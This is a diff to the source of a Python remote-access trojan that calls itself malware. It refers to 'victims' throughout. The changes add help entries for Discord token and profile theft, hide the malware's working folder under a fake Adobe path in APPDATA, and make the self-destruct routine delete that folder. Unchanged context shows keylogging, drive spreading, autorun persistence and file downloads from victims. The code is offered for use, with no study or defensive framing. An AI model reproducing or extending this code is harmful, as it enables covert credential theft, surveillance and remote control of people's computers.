@@ -47,7 +47,7 @@ __SERVER_BOT = None
 # Tags of the victim (Set in load_tags).
 __TAGS = []
 
-# Folder of the malware (Set in get_folder_path)
+# Folder of the malware (Set in set_folder_path)
 __FOLDER = ""
 
 # Keylog string.
@@ -102,7 +102,7 @@ KEYLOGGER_DISABLED = True
 SPREADING_SKIPPED_DRIVES = ("C", "D")
 
 # Version of the malware.
-VERSION = "[Pre-release] 0.4.2"
+VERSION = "[Pre-release] 0.4.3"
 
 
 def filesystem_get_size(_path: str) -> int:
@@ -407,8 +407,34 @@ def command_help(_arguments, _event) -> str:
     # @returns str
     # @description Function for command "help" that returns list of all commands.
 
-    # Returning.
-    return str(__COMMANDS_HELP) # noqa
+    # Getting arguments.
+    _arguments = _arguments.split(";")
+
+    if len(_arguments) > 0 and _arguments[0] != "":
+        # If command given.
+
+        # Getting command.
+        _help_command = _arguments[0]
+
+        if _help_command not in __COMMANDS_HELP:
+            # If command not exists.
+
+            # Error.
+            return f"Command {_help_command} not exists!"
+
+        _help_information = __COMMANDS_HELP[_help_command]
+        # Returning information.
+        return f"[{_help_command}]:\n-- {_help_information[0]}\n--(Use: {_help_information[1]})"
+    else:
+        # If total help.
+
+        _help = ""
+
+        for _command, _information in __COMMANDS_HELP.items():
+            _help += f"[{_command}]: \n--{ _information[0]}\n-- (Use: {_information[1]})\n"
+
+        # Returning.
+        return _help # noqa
 
 
 def command_tags_new(_arguments, _event) -> str:
@@ -728,6 +754,9 @@ def command_destruct(_arguments, _event) -> str:
     # Unregistering from the autorun.
     autorun_register()
 
+    # Removing working folder path.
+    os.remove(__FOLDER)
+
     # Exiting.
     return command_exit(_arguments, _event)
 
@@ -777,6 +806,7 @@ def command_drives(_arguments: str, _event) -> str:
 
     # Returning.
     return ", ".join(filesystem_get_drives_list())
+
 
 def command_discord_tokens(_arguments: str, _event) -> str:
     # @function command_discord_tokens()
@@ -1009,7 +1039,7 @@ def set_folder_path() -> None:
     global __FOLDER
 
     # Setting folder.
-    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\"
+    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\PMT\\Storage"
 
 
 def get_folder_path() -> str:
@@ -1196,6 +1226,14 @@ def initialise_commands() -> None:
     }
 
     __COMMANDS_HELP = {
+        "discord_tokens": (
+            "Returns you all found Discord tokens in victim system",
+            "discord_tokens"
+        ),
+        "discord_profile": (
+            "Returns you all information about victim Discord profile",
+            "discord_profile"
+        ),
         "download": (
             "Downloads file from the victim client.",
             "download [required]PATH"
@@ -1244,11 +1282,11 @@ def initialise_commands() -> None:
             "ls"
         ),
         "drives": (
-            "Returns list of the all drives in the system separated by ,(comma)"
+            "Returns list of the all drives in the system separated by ,(comma)",
             "drives"
         ),
         "tags_new": (
-            "Replaces all old tags with these new."
+            "Replaces all old tags with these new.",
             "tags_new [required]TAGS(Separated by;)"
         ),
         "tags_add": (
